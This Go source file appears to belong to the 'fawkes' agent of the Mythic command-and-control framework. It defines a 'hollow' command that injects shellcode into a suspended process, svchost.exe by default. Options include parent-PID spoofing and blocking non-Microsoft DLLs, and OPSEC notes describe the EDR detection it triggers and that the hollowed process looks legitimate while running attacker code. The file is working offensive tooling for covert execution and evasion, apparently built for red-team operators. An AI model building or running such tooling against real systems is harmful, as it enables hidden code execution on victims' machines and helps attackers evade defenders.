package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "hollow",
		Description:         "Process hollowing — create a suspended process and redirect its main thread to execute shellcode via SetThreadContext (T1055.012)",
		HelpString:          "hollow",
		Version:             1,
		MitreAttackMappings: []string{"T1055.012"},
		SupportedUIFeatures: []string{"process_browser:inject"},
		Author:              "@galoryber",
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "hollow_new.js"), Author: "@galoryber"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "Select shellcode from files registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "shellcode_b64",
				ModalDisplayName: "Shellcode (Base64)",
				CLIName:          "shellcode_b64",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Base64-encoded shellcode (for CLI/API usage)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "CLI",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "target",
				ModalDisplayName: "Target Process",
				CLIName:          "target",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Process to create and hollow (default: svchost.exe)",
				DefaultValue:     `C:\Windows\System32\svchost.exe`,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 2},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 2},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 2},
				},
			},
			{
				Name:             "ppid",
				ModalDisplayName: "Parent PID (Spoof)",
				CLIName:          "ppid",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Parent PID to spoof (optional — uses explorer.exe or similar)",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 3},
				},
			},
			{
				Name:             "block_dlls",
				ModalDisplayName: "Block Non-MS DLLs",
				CLIName:          "block_dlls",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Block non-Microsoft DLLs from loading in the hollowed process",
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 4},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 4},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			target, _ := taskData.Args.GetStringArg("target")
			if target == "" {
				target = "svchost.exe"
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Process hollowing creates a suspended %s process, allocates RWX memory, overwrites thread context, and resumes execution. Generates process creation events (Sysmon 1), memory allocation (Sysmon 8), and thread context modification artifacts. Highly signatured by EDR.", target),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Process hollowing completed. Target process memory has been replaced with injected code. The hollowed process appears legitimate to tasklist/Process Explorer but contains attacker code. Cleanup: kill the target PID when no longer needed.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			// Check for direct base64 shellcode first (CLI/API usage)
			var shellcodeB64 string
			var filename string

			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
			if sc != "" {
				shellcodeB64 = sc
				filename = "(inline)"
			} else {
				// File-based: resolve via helper
				fname, fileContents, fErr := resolveFileContents(taskData)
				if fErr != nil {
					response.Success = false
					response.Error = fErr.Error()
					return response
				}
				filename = fname
				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
			}

			// Get optional parameters
			target, _ := taskData.Args.GetStringArg("target")
			ppid, _ := taskData.Args.GetNumberArg("ppid")
			blockDLLs, _ := taskData.Args.GetBooleanArg("block_dlls")

			if target == "" {
				target = `C:\Windows\System32\svchost.exe`
			}

			// Decode to get size for display
			scBytes, err := base64.StdEncoding.DecodeString(shellcodeB64)
			if err != nil {
				logging.LogError(err, "Failed to decode shellcode for size check")
			}

			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)\nTarget: %s", filename, len(scBytes), target)
			if int(ppid) > 0 {
				displayParams += fmt.Sprintf("\nPPID spoof: %d", int(ppid))
			}
			if blockDLLs {
				displayParams += "\nBlock non-MS DLLs: true"
			}
			response.DisplayParams = &displayParams

			createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("Process hollowing: %s (shellcode: %d bytes)", target, len(scBytes)))

			// Build agent parameters
			agentParams := map[string]interface{}{
				"shellcode_b64": shellcodeB64,
				"target":        target,
				"ppid":          int(ppid),
				"block_dlls":    blockDLLs,
			}
			paramsJSON, err := json.Marshal(agentParams)
			if err != nil {
				response.Success = false
				response.Error = "Failed to marshal parameters: " + err.Error()
				return response
			}
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			host := processResponse.TaskData.Callback.Host
			target, _ := processResponse.TaskData.Args.GetStringArg("target")
			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           processResponse.TaskData.Task.ID,
				BaseArtifactType: "Process Injection",
				ArtifactMessage:  fmt.Sprintf("Process hollowing into %s on %s", target, host),
			})
			logOperationEvent(processResponse.TaskData.Task.ID,
				fmt.Sprintf("[EXECUTION] Process hollowing → %s on %s", target, host), true)
			return response
		},
	})
}
